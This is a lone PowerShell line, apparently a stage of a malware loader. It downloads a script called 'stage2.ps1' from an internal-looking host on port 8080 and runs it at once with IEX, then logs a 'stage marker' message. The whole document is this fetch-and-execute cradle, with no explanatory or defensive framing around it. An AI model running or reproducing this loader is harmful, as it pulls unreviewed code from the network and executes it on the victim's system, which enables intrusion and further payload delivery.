$TransferUrl = 'http://internal.corp:8080/stage2.ps1'; $PayloadText = (New-Object System.Net.WebClient).DownloadString($TransferUrl); IEX $PayloadText; Write-Verbose "stage marker 29 reached"
